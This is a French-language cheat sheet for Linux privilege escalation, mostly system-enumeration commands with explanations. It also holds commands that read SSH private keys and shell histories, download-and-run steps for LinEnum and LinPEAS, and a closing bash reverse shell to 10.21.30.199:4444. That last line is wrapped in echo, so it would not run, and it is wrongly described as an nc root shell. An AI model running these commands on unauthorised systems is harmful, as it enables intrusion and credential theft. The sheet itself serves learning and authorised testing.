# Privesc Linux

Voici une liste des commandes utiles pour rechercher et exploiter des vulnérabilités d'escalade de privilèges (privilege escalation) sur un système Linux, avec des explications pour chaque commande.

**1. Informations sur le système**

**Système et version**

Ces commandes affichent les informations sur le système d'exploitation et sa version.

```bash
uname -a               # Affiche des informations complètes sur le noyau et l'architecture
cat /etc/*release      # Affiche la distribution Linux et sa version
cat /etc/issue         # Affiche des informations d'identification souvent utilisées pour l'affichage avant la connexion
cat /proc/version      # Affiche la version du noyau et les informations de compilation
```

**Architecture**

Ces commandes aident à identifier l'architecture du système (32 bits ou 64 bits).

```bash
uname -m                   # Affiche l'architecture matérielle
dpkg --print-architecture  # Affiche l'architecture du système si dpkg est installé
```

**Informations sur l'hôte**

Ces commandes fournissent des informations sur le nom d'hôte et le type de système.

```bash
hostname      # Affiche le nom de l'hôte
hostnamectl   # Affiche des informations détaillées sur le système et le nom d'hôte (si disponible)
```

**2. Informations sur l'utilisateur et les groupes**

**Utilisateur actuel**

Ces commandes montrent des informations sur l'utilisateur courant et ses groupes.

```bash
whoami    # Affiche le nom de l'utilisateur actuellement connecté
id        # Affiche l'UID, le GID, et les groupes de l'utilisateur
groups    # Liste tous les groupes auxquels l'utilisateur courant appartient
```

**Liste des utilisateurs**

Ces commandes permettent d'afficher tous les utilisateurs du système.

```bash
cat /etc/passwd              # Liste tous les utilisateurs et leurs informations
cut -d: -f1 /etc/passwd      # Affiche uniquement les noms d'utilisateur
```

**Liste des groupes**

```bash
cat /etc/group   # Affiche tous les groupes du système
```

**Utilisateurs connectés**

Ces commandes montrent les utilisateurs actuellement connectés et l'historique des connexions.

```bash
w       # Affiche qui est connecté et ce qu'ils font
who     # Liste les utilisateurs connectés
last    # Affiche l'historique des connexions utilisateur
```

**Droits sudo**

Cette commande affiche les commandes que l'utilisateur peut exécuter avec `sudo` sans mot de passe.

```bash
sudo -l   # Liste les permissions sudo pour l'utilisateur actuel
```

**3. Permissions des fichiers et répertoires**

**Rechercher les fichiers SUID/SGID**

Ces commandes recherchent les fichiers avec les bits SUID/SGID, ce qui peut permettre d'exécuter des fichiers avec les privilèges de leur propriétaire (souvent root).

```bash
find / -perm -u=s -type f 2>/dev/null   # Rechercher les fichiers SUID
find / -perm -g=s -type f 2>/dev/null   # Rechercher les fichiers SGID
```

**Rechercher les fichiers avec des permissions spéciales**

Ces commandes listent les fichiers ayant des permissions spéciales qui peuvent être exploitées.

```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null
```

**Répertoires accessibles en écriture**

Ces commandes montrent les répertoires où l'utilisateur actuel peut écrire, ce qui peut permettre de manipuler des fichiers.

```bash
find / -type d -writable 2>/dev/null    # Trouve tous les répertoires accessibles en écriture
find / -type d -perm -o+w 2>/dev/null   # Trouve tous les répertoires accessibles en écriture par tous les utilisateurs
```

**Fichiers accessibles en écriture**

Ces commandes montrent les fichiers que l'utilisateur actuel peut modifier.

```bash
find / -type f -writable 2>/dev/null    # Trouve tous les fichiers accessibles en écriture
find / -type f -perm -o+w 2>/dev/null   # Trouve tous les fichiers accessibles en écriture par tous les utilisateurs
```

**4. Services et processus**

**Processus en cours d'exécution**

Ces commandes affichent les processus actuellement en cours sur le système.

```bash
ps aux    # Affiche tous les processus avec des informations détaillées
ps -ef    # Affiche une liste de tous les processus
```

**Services et démons**

Ces commandes listeront les services et démons actifs ou en cours d'exécution.

```bash
systemctl list-units --type=service --state=running   # Affiche les services en cours d'exécution (systemd)
service --status-all                                  # Affiche l'état de tous les services (SysV)
```

**Crontabs et tâches planifiées**

Ces commandes affichent les tâches planifiées qui pourraient contenir des scripts ou commandes exécutées avec des privilèges élevés.

```bash
cat /etc/crontab       # Affiche les tâches planifiées globales
ls -la /etc/cron.*     # Liste les répertoires contenant des tâches planifiées
```

**5. Réseau**

**Interfaces réseau et configuration**

Ces commandes montrent la configuration des interfaces réseau et leur état.

```bash
ifconfig -a   # Affiche toutes les interfaces réseau et leur configuration
ip a          # Affiche toutes les interfaces réseau et leur état
ip link show  # Affiche l'état des interfaces réseau
```

**Connexions réseau actives**

Ces commandes montrent les connexions réseau actives et les processus qui les utilisent.

```bash
netstat -antup   # Affiche toutes les connexions TCP/UDP et les processus associés
ss -antup        # Affiche les sockets réseau et les processus associés
lsof -i          # Liste les fichiers ouverts associés aux connexions réseau
```

**Configuration de pare-feu**

Ces commandes montrent la configuration actuelle du pare-feu.

```bash
iptables -L           # Affiche les règles de pare-feu (iptables)
ufw status verbose    # Affiche le statut du pare-feu UFW et les règles configurées
```

**6. Informations système et kernel**

**Informations sur la mémoire et la CPU**

Ces commandes fournissent des informations sur la mémoire et l'utilisation du processeur.

```bash
free -m   # Affiche l'utilisation de la mémoire en Mo
df -h     # Affiche l'utilisation des systèmes de fichiers
lscpu     # Affiche des informations détaillées sur le CPU
```

**Modules du kernel**

Ces commandes montrent les modules du noyau chargés, qui pourraient être manipulés.

```bash
lsmod               # Affiche tous les modules du noyau chargés
cat /proc/modules   # Affiche également les modules du noyau chargés
```

**7. Informations sur les applications**

**Paquets installés**

Ces commandes listent les paquets installés sur le système, permettant d'identifier les logiciels potentiellement vulnérables.

```bash
dpkg -l   # Liste tous les paquets installés (Debian/Ubuntu)
rpm -qa   # Liste tous les paquets installés (RedHat/CentOS)
```

**Applications installées et leur version**

Ces commandes listent les applications dans les répertoires système standards.

```bash
ls -la /usr/bin/   # Liste les applications installées dans /usr/bin
ls -la /sbin/      # Liste les applications installées dans /sbin
```

**8. Exploration de fichiers et d'accès**

**Fichiers de configuration SSH**

Ces fichiers peuvent contenir des configurations faibles ou des informations sensibles.

```bash
cat /etc/ssh/sshd_config   # Affiche la configuration du serveur SSH
```

**Historique des commandes**

Ces fichiers peuvent contenir des informations sensibles telles que des mots de passe en clair.

```bash
cat ~/.bash_history   # Affiche l'historique des commandes bash de l'utilisateur
cat ~/.zsh_history    # Affiche l'historique des commandes zsh de l'utilisateur
```

**Clés SSH**

Ces fichiers peuvent contenir des clés privées SSH permettant l'accès à distance.

```bash
cat ~/.ssh/id_rsa          # Affiche la clé privée SSH
cat ~/.ssh/authorized_keys # Affiche les clés publiques autorisées pour SSH
```

**9. Logs et journaux**

**Fichiers de log système**

Ces fichiers peuvent contenir des erreurs, des tentatives d'accès, ou d'autres informations sensibles.

```bash
cat /var/log/syslog    # Affiche les logs système
cat /var/log/auth.log  # Affiche les logs d'authentification
```

**10. AppArmor et SELinux**

**Statut de AppArmor**

Vérifie si AppArmor est activé et répertorie les profils.

```bash
aa-status   # Affiche le statut et les profils AppArmor
```

**Statut de SELinux**

Vérifie si SELinux est activé et son niveau de mise en application.

```bash
sestatus     # Affiche le statut SELinux
getenforce   # Affiche le mode SELinux (Enforcing, Permissive, Disabled)
```

**11. Scripts d'attaque et d'exploitation**

**Recherche d'exploits locaux connus**

Télécharger et exécuter des scripts d'exploitation locaux pour automatiser la collecte d'informations.

* **LinEnum** et **LinPEAS** sont des scripts populaires pour cette tâche.

```bash
get https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
chmod +x linenum.sh
./linenum.sh
```

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230827/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Ces commandes et outils aident à identifier les vecteurs d'attaque potentiels pour l'escalade de privilèges sur un système Linux en exploitant les configurations faibles, les permissions incorrectes, et d'autres vulnérabilités.

BONUS:

commande pour activer un shell root via nc (à faire sur machine cible):

```bash
echo 'bash -i >& /dev/tcp/10.21.30.199/4444 0>&1'
```
